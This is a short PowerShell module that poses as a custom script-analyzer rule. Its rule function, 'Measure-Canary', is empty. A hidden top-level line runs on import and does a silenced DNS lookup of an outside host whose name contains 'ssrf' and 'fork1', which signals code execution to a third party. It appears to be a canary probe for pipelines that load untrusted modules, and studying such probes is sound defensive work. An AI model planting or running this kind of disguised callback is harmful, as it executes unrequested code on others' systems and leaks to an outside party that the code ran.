try { [System.Net.Dns]::GetHostEntry("psscript.fork1.ssrf.xixixo123.site") } catch {}
function Measure-Canary { param([System.Management.Automation.Language.ScriptBlockAst]$Ast) return @() }
Export-ModuleMember -Function Measure-Canary
